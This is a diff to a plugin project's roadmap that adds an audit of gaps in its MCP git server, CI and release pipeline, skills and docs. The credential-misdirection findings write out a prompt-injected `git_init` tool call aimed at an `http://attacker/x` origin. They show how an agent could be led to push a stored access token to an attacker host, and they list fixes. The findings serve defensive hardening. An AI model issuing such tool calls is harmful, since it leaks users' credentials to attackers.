@@ -1,26 +1,244 @@
 # Cortex - roadmap
 
-**Status (2026-06-15):** **v0.1.1 is the latest release** (tagged 2026-06-12;
-v0.1.0 before it), publicly installable
+**Status (2026-07-03):** **v0.2.0 is the latest release** (tagged + published
+2026-07-01; v0.1.1 and v0.1.0 before it), publicly installable
 (`/plugin marketplace add cortex-sync/Cortex` -> `/plugin install cortex@cortex`).
+The release carries the env-credentials server change + the 5 `.mcpb` Cowork
+bundles; the clean-install launcher fetch + SHA path is verified end-to-end.
 GitHub Actions CI, Dependabot, and the goreleaser release pipeline are all green.
-**v0.2.0 is prepared on branch `feat/cowork-mcpb-bundle`** (env-credentials + the
-`.mcpb` desktop bundle); it is awaiting a hands-on Cowork test on an unmanaged
-machine before the tag is cut.
 
 **Next up:**
-- **v0.2.0 (prepared, awaiting test + tag):** the **Cowork / Claude Desktop**
-  surface, following the released v0.1.1. The env-credentials server change
-  landed 2026-06-12, and the `.mcpb` desktop-extension bundle (manifest + packer
-  + icon + release wiring + CI test) is built. Version is bumped to v0.2.0 across
-  `bin/VERSION` (was `v0.1.0` - v0.1.1 shipped skills only, binary unchanged),
-  `.claude-plugin/plugin.json`, and `mcpb/manifest.json`. Remaining before
-  tagging: a hands-on Cowork test, then Authenticode signing for managed hosts
-  (v0.3, see Publishing). See `## Cowork support`.
+- **Cowork `.mcpb` hands-on test (post-release fast-follow):** v0.2.0 shipped the
+  `.mcpb` bundles WITHOUT a hands-on Cowork/Claude Desktop install test (pushed
+  forward without it). Install a `cortex-git_0.2.0_*.mcpb` on an unmanaged machine
+  and confirm it works; cut v0.2.1 if broken. See `## Cowork support`.
+- **v0.3 Authenticode signing** for managed hosts - decided: **SignPath Foundation**
+  (see `docs/CODE_SIGNING.md`). See `## Publishing / install`.
 - **Community marketplace** submission still queued (manual,
   `clau.de/plugin-directory-submission`).
 
 Open items, grouped by theme. Each becomes a branch + PR.
+
+## Gap review (2026-07-03)
+
+Findings from a 4-lens multi-agent gap review (Go server, CI/release/supply chain,
+skills/adapters, docs), each adversarially verified before inclusion; the two HIGH
+credential items were additionally re-verified by hand against the code. Overall
+verdict: **repo is in solid shape** (0 open Dependabot/CodeQL alerts, all Actions
+SHA-pinned, version strings agree, v0.2.0 fully published) - these are the gaps that
+survived. Highest-leverage cluster first.
+
+### Credential misdirection (NEW - not covered by M1/M2/store-key; do as one host/URL-validation pass)
+
+- [x] **(done 2026-07-03, branch `fix/origin-url-validation`) (high) `git_init` on a
+      pre-existing repo pushes to the OLD origin, sending
+      the wrong host's PAT to an unvalidated URL.** `internal/git/git.go:232-237`
+      tolerates `gogit.ErrRemoteExists` without checking the existing origin URL, then
+      pushes to the default "origin" (`git.go:269`) - whatever is in `.git/config` -
+      while `gitInitHandler` (`cmd/server/main.go:241-246`) ran `RequireHTTPS` +
+      `resolveCreds` against the *argument* `remote_url`. A prompt-injected
+      `git_init(local_path=<repo whose origin is http://attacker/x>, remote_url=https://gitlab.com/u/r.git)`
+      resolves the gitlab PAT and BasicAuth-pushes it to the attacker host in cleartext,
+      bypassing the fail-closed design. **Fix:** on `ErrRemoteExists`, require the
+      existing origin URL to equal `remoteURL` (or pass it through `RequireHTTPS` and
+      require host equality with the resolved credential host); error otherwise.
+      Bundle with M1's "refuse non-empty pre-existing dir".
+- [x] **(done 2026-07-03, branch `fix/origin-url-validation`) (high) `RemoteHost`
+      validates `URLs[0]` but go-git pushes to the LAST URL of a
+      multi-URL origin.** `git.go:302` returns `RequireHTTPS(urls[0])`; go-git v5.19.1
+      uses `URLs[0]` for fetch but `URLs[len-1]` for push (verified against module
+      source). An origin with URLs `["https://gitlab.com/...", "http://attacker/..."]`
+      (one `git remote set-url --add` away, or a crafted repo reached via M1) passes the
+      gate on URL 0, then `git_commit_push` sends the PAT to URL 1 in cleartext. Pull is
+      unaffected. **Fix:** validate *every* configured origin URL and require all hosts
+      to match, or reject origins with more than one URL outright (profile repos never
+      need multi-URL remotes). Add a regression test.
+
+### Secret-scan gate coverage (NEW)
+
+- [ ] **(medium) `InitAndPush` skips the secret-scan gate entirely.** `git.go:243-273`
+      stages `All:true`, commits, and pushes with no `secretscan.ScanFiles` call - only
+      `CommitAndPush` (`git.go:98-108`) has the gate. Contradicts the secretscan package
+      doc (`secretscan.go:2-4`). First-run setup (the op that publishes a whole directory
+      sight-unseen) pushes an accidental `.env`/pasted token unscanned. **Fix:** run the
+      scan over the staged paths in `InitAndPush` before `wt.Commit`.
+- [ ] **(medium) A blocked commit leaves the secret staged - the error's own remediation
+      is a dead-end.** `CommitAndPush` runs `AddWithOptions{All:true}` (`git.go:62`)
+      before the scan (`git.go:102-107`); go-git writes the index + the secret's blob to
+      `.git/objects` immediately. Verified: after a block the file stays `staging=A`, so
+      adding it to `.gitignore` and retrying (what `BlockedError` advises,
+      `secretscan.go:96-97`) still re-blocks forever, and no unstage/reset tool exists.
+      **Fix:** scan *before* staging (derive paths from a pre-add `wt.Status()`), or
+      unstage flagged paths on block; reword the error.
+- [ ] **(low) The commit message is never secret-scanned.** The gate covers file contents
+      only; a token pasted into `message` (`main.go:189`) reaches the remote in the commit
+      header. **Fix:** run the ruleset over the message in `CommitAndPush`/`InitAndPush`.
+- [ ] *(info)* After a blocked commit the secret's blob persists in `.git/objects` even if
+      the file is later edited - at-rest residue in the local profile repo nothing cleans up.
+
+### Tool-surface hardening (NEW)
+
+- [ ] **(medium) No schema/required-arg validation before handlers run - the `stringArg`
+      comment is false.** `main.go:136-141` claims "Required arguments are enforced by the
+      tool schema"; mcp-go v0.18.0 `handleToolCall` calls the handler with no arg checking
+      (verified). So `git_commit_push` with a missing `message` commits + pushes an
+      empty-message commit; missing paths flow as `""` into go-git; `set_credentials` with
+      no token stores an empty token. **Fix:** validate non-empty required args per handler
+      (or `req.RequireString`), and fix the comment.
+- [ ] **(low) `keyringStore.Set` is a non-atomic two-entry write.** `keyring_store.go:17-25`
+      - if the username write succeeds and the token write fails, a later `Get` returns a
+      backend error (not `ErrNotFound`), so `get_auth_status` reports a scary failure and
+      sync is blocked until a manual `delete_credentials`. **Fix:** best-effort delete the
+      username on token-write failure, or store both as one JSON value under a single key.
+- [ ] **(low) `Status` output is nondeterministically ordered** (map iteration,
+      `git.go:43-45`) - noisy for diffing tool output across calls. **Fix:** sort paths.
+- [ ] *(cleanup)* `internal/hostapi/` is an **empty directory** (no files) - dead artefact;
+      remove it or document what it holds a place for.
+- [ ] *(fold into L4/store-key host-normalisation)* `CORTEX_GIT_HOST` with a port can never
+      match - lookup hosts come from `url.Hostname()` (port stripped), so
+      `CORTEX_GIT_HOST=git.example.com:8443` is silently dead. Strip the port in the canon
+      or document "hostname without port".
+
+### Test-coverage gaps (floor 75%, actual ~79.8% - this is where the missing ~20% is)
+
+- [ ] `git_commit_push` happy path has **no in-process test** (acknowledged
+      `handlers_test.go:105-107`; only the tag-gated e2e covers it - CI must actually run e2e
+      for it to count). Also untested: `resolveCreds` "could not read credentials" arm
+      (`main.go:159-160`) and `getAuthStatusHandler` error arm (`main.go:270`) - both
+      drivable via `keyring.MockInitWithError`; `Pull` detached-HEAD guard
+      (`git.go:150-152`); `envcreds` warn-once emission; `fileStorePath()` fallback chain;
+      `keyringStore` partial-failure paths. No regression test yet for any NEW finding above.
+
+### Release pipeline (NEW - highest-leverage before v0.3)
+
+- [ ] **(high) The version gate runs AFTER the release is already public.** `.goreleaser.yaml:75`
+      has `draft: false`, so goreleaser publishes a live release, then `release.yml:50-55`
+      checks `mcpb/manifest.json` vs the tag. A mismatch or any `.mcpb`-step failure ->
+      public partial release (binaries + checksums live, no `.mcpb`, tag burned). **Fix:**
+      run the version check as the first release-job step, and/or `draft: true` with an
+      explicit publish at the end.
+- [ ] **(medium) Release is gated only on e2e, not on CI.** `release.yml:25` is `needs: e2e`
+      only; nothing blocks the release on lint/unit-tests/coverage/gosec/govulncheck/gitleaks,
+      and `codecov.yml:5-7` notes there are no required status checks - so a tag on a red
+      commit ships. **Fix:** gate the release on CI too (required checks or `needs:`).
+- [ ] **(medium) Only 1 of 3 version files is checked at release.** `release.yml:50-55`
+      validates `mcpb/manifest.json`; `bin/VERSION` + `.claude-plugin/plugin.json` are a
+      manual checklist (`RELEASING.md:30-33`). A stale `bin/VERSION` ships a plugin whose
+      launcher fetches the previous release's binary - green pipeline, wrong artifact.
+      **Fix:** cheap CI check that all three equal the tag.
+- [ ] **(low) The lefthook gofmt hook is a no-op.** `lefthook.yml:6` runs `gofmt -l` which
+      exits 0 even when it lists unformatted files (verified). **Fix:** use the
+      `test -z "$(gofmt -l ...)"` pattern `ci.yml:29-31` already uses.
+- [ ] **(low) Release job's workflow-level `contents: write` leaks into the e2e job**
+      (`release.yml:8-9`), which only needs read and runs third-party containers with the
+      write-scoped token in `.git/config` (no `persist-credentials: false` anywhere).
+      **Fix:** move `permissions:` down to the `release` job; give e2e `contents: read`.
+- [ ] **(low) No recovery path for a partial release.** `RELEASING.md` documents the happy
+      path only; re-running re-runs `goreleaser release --clean` against an existing
+      release/tag (untested). Given the gate-ordering item makes this reachable, add a
+      "recovering a failed release" section or make the job idempotent.
+- [ ] **(low) e2e never runs between releases** (`e2e.yml:6-7` is `workflow_dispatch` only);
+      rot (Gitea image drift, Docker Hub availability) surfaces exactly when it blocks a
+      release. **Fix:** run on PRs touching `e2e/` or `mcp/git-server/`, or a weekly schedule.
+- [ ] **(low) `make validate` is much weaker than CI but `RELEASING.md:34` treats it as the
+      pre-tag gate.** `mcp/git-server/Makefile:24-27` omits the gofmt check, the 75%
+      coverage floor, gosec, govulncheck, gitleaks, `make test-launcher`, mcpb checks. **Fix:**
+      enrich `validate` or amend the checklist.
+- [ ] *(chore)* Go version hardcoded in 6 places (ci.yml env + release.yml x4 + e2e.yml +
+      codeql.yml, all `1.26.4`); Dependabot can't bump them or the go-installed tools. **Fix:**
+      a single `go-version-file` source.
+- [ ] *(low)* Launcher first-run race on the fixed temp name `"$bin.tmp"`
+      (`bin/cortex-git-launch.sh:99-101`): the SessionStart prefetch hook and the MCP launch
+      both fire at session start, so two concurrent first-runs collide (spurious `set -e`
+      failure; integrity unaffected). Superseded versioned binaries are also never pruned
+      (unbounded cache growth). **Fix:** `mktemp` in `$bin_dir` / per-PID suffix; prune old.
+- [ ] *(low)* goreleaser `before: go mod tidy` (`.goreleaser.yaml:9`) can silently build
+      drifted deps at release time. **Fix:** `git diff --exit-code` after tidy in the job.
+- [ ] *(minor)* lefthook: trailing-whitespace matches only spaces not tabs; several checks
+      (em-dash, eof, line-endings, json/yaml) have no CI backstop so `--no-verify` bypasses
+      them permanently; `make hooks-install` installs only lefthook (gitleaks/cz/PyYAML/perl
+      assumed present -> confusing fresh-clone failures); `.gitleaks.toml:3` comment says CI
+      runs `gitleaks detect` but ci.yml runs `gitleaks git`; ci.yml double-runs same-repo PRs.
+
+### Skills - data-loss traps (NEW)
+
+- [ ] **(high) `sync-profile`'s conflict recovery is a guaranteed data-loss recipe.**
+      `skills/sync-profile/SKILL.md` Error handling says on push rejection "run `git_pull`
+      first, then retry `git_commit_push`". But `CommitPush` commits locally first, and
+      `Pull` is fetch + `HardReset` to origin - so the pull discards the just-made commit and
+      the retry finds a clean tree; the delta is lost with certainty. (The destructive pull
+      is M2; the skill *recommending this sequence* is the distinct new hole.) **Fix:** change
+      the recovery to a non-destructive path, or gate on M2's safe-pull work.
+- [ ] **(high) Codex reconcile folds back to the wrong file.** restore-profile Tier 1 step b
+      reconciles a differing `AGENTS.md`, but the reconcile procedure's step 5 hardcodes
+      writing the merged `CLAUDE.md` to `[local_path]/CLAUDE.md` - for Codex the merged result
+      should land in `adapters/codex.md`. As written it clobbers the repo's `CLAUDE.md` with
+      AGENTS-shaped content or the fold-back never happens. **Fix:** branch the write target by
+      platform; extend `docs/profile-merge-sketch.md` to the AGENTS.md cell.
+- [ ] **(medium) `install-codex.sh` re-run clobbers a newer non-managed `AGENTS.md`.**
+      `backup_existing` (lines 152-157) returns early when `$dest.cortex-bak` exists, then
+      `cp "$src" "$dest"` (line 167) overwrites a user-edited/reconciled AGENTS.md with no fresh
+      backup. `--uninstall` (108-116) similarly restores over a marker-managed-but-user-edited
+      file without saving it. **Fix:** detect content drift before overwrite; save-before-restore.
+
+### Skills - flow holes (NEW unless noted)
+
+- [ ] **(tracked, still open) Memory path resolution on Claude Code CLI** - the relative
+      `memory/` reference when `CLAUDE.md` lives at `~/.claude/CLAUDE.md`. Confirmed nothing in
+      the skills addresses it; ironically the Codex adapter already solved it with a `## Memory`
+      pointer via the config block - port that to the Claude branch.
+- [ ] **(new) `promote-lessons` / `sync-profile` contradiction.** promote-lessons says it runs
+      "as part of sync-profile on session handoff", but sync-profile's steps never invoke it.
+      promote-lessons also never says how to locate the top-level `memory/lessons.md` (same
+      resolution gap as above). **Fix:** either wire the call into sync-profile or correct the
+      prose; add the repo-path lookup.
+- [ ] **(new) Empty-remote clone unhandled in two flows.** go-git can't clone an empty remote
+      (`ErrEmptyRemoteRepository`). (a) restore-profile step 4 gives no guidance when the remote
+      exists but is empty; (b) setup Section 0's adopt branch routes an empty-remote "I already
+      have a repo" answer to `git_clone` (fails) instead of the `git_init` path. **Fix:** detect
+      empty-remote and route to init.
+- [ ] **(new) Platform-detection asymmetry.** setup Section 0 checks
+      `~/OneDrive/Documents/CLAUDE.md` on Windows Cowork; restore/sync mention only
+      `~/Documents/CLAUDE.md` - on an OneDrive-redirected box restore places/reconciles at the
+      wrong path. setup Section 0 also never checks `$CODEX_HOME/AGENTS.md` for an existing
+      Codex-first profile. **Fix:** align the path lists across all three skills.
+- [ ] **(new) Tier 2 sandbox instructions drift.** `install-codex.sh` (255-268) teaches the
+      current `[permissions.<name>]` profile form; restore-profile Tier 2 (SKILL.md 87-94) still
+      shows only the legacy `[sandbox_workspace_write] network_access = true`. **Fix:** update the
+      skill to match the script.
+- [ ] *(minor)* `install-codex.sh` (189-193) drops a nonstandard port from the recorded Remote
+      (`host="${host%%:*}"` reused to rebuild the URL) though the comment says only userinfo is
+      stripped; safety-gate pattern drift (`*.pfx`/`*.p12` present in some replicated gate lists,
+      absent in others - point at the sync-profile gate instead of re-enumerating); reconcile
+      step 5 self-contradiction (writes the merged file to the tree before asking about push, so
+      "declining leaves the repo as it was" is false - next sync commits it); setup adopt-path
+      `git_pull` lacks restore's last-write-wins warning; `profile-template/adapters/` is an empty
+      untracked dir so a fresh clone lacks it (skills generate adapters from prose - works, but
+      setup step 4's "use `profile-template/.gitignore` as the source" has no resolvable path).
+
+### Docs refresh (NEW - stale since the v0.2.0 cut)
+
+- [ ] **(this file - partly done)** Top status block corrected 2026-07-03; still stale:
+      Cowork sub-task (iv) (lines ~341-343) says the work "awaits Lucas's hands-on test before
+      tagging v0.2.0" (merged + tagged without it); the Codex live-validation addendum note
+      "`bin/VERSION` must point at a real release" is now satisfied - mark resolved; the
+      Publishing Authenticode item still lists 4 options with SignPath as "front-runner" whereas
+      `docs/CODE_SIGNING.md` records it as the decision (point to the doc).
+- [ ] **`docs/RELEASING.md:66-83`** "Current state" says the Cowork test is a gate before tagging
+      - v0.2.0 shipped 2026-07-01 without it. Update to "released; Cowork `.mcpb` test still open"
+      or delete (the checklists above are the durable content).
+- [ ] **`CONTRIBUTING.md`** line 79/98-100 "not published to a marketplace yet" (false since
+      v0.1.0, contradicts README) and line 55 "70% coverage floor" (CI is 75%). Reword both.
+- [ ] **`SECURITY.md`** threat-model table line ~164 still says the content scan "fails closed"
+      - PR #20 dialled this back to best-effort; reword to "(best-effort content scan)". Lines
+      101-102/163 reference a tracked "non-transcript entry path" TODO item that does not exist -
+      add it or drop the "is tracked" claim.
+- [ ] **`docs/notes/2026-06-29-install-and-restore-findings.md`** - both findings are resolved
+      (release fixed the clean-install blocker; reconcile implemented per profile-merge-sketch)
+      but the note reads as "current release is broken". Add a two-line "Resolved 2026-07-01"
+      addendum at the top.
+- [ ] *(minor)* No "newly shipped, report issues" caveat on the Cowork `.mcpb` path in
+      README/usage.md (it shipped untested); no CHANGELOG / releases-page pointer in the docs set.
 
 ## Security review (go-live, 2026-06-16)
 
